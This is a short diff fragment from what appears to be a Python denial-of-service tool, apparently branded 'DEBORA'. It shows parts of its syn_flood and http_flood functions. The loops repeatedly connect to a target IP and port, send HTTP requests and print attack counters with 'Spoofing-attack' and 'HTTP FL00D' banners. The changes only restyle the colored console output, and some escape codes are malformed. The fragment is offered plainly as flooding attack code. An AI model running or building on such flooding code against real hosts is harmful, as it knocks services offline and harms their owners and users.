@@ -110,7 +110,7 @@ def syn_flood(ip, port, duration):
             sock.connect((ip, port))
             sent += 1
             print(f"\033[100m\033[97mSyn flood\033[0m \033[32m{sent} \033[96m{ip}\033[0m 033[37Spoofing-attack")
-            print(f"\033[48;5;7m\033[38;5;0mSyn flood\033[0m \033[33m{sent} \033[94m{ip} \033[38;5;1mSpoofing-attack\033[0m")
+            print(f"\033[48;5;7m\033[30mSyn flood\033[0m \033[33m{sent} \033[94m{ip} \033[1mSpoofing-attack\033[0m")
             sock.close()
         except OSError:
             pass
@@ -141,7 +141,7 @@ def http_flood(ip, port, duration):
             sock.connect((ip, port))
             sock.sendall(http_request)
             sent += 1
-            print(f"\033[31m[]  \033[7m\033[97mD E B 0 R A\033[0m  \033[100m\033[31mHTTP FL00D\033[0m  \033[32m{sent} TARGET  \033[103m\033[97m{ip}\033[0m  \033[97mrunning")
+            print(f"\033[748;5;3m\033[30mHttp-flood\033[0m \033[32m{sent} \033[37m" +(http_request)+ "")
             print(f"\033[33m[]  \033[32mD E B 0 R A  \033[32mHTTP FL00D \033[0m \033[33m{sent} TARGET  \033[38;5;206m{ip}. \033[33mrunning\033[0m")
         except KeyboardInterrupt:
             print("\n[-] Attack stopped by user")
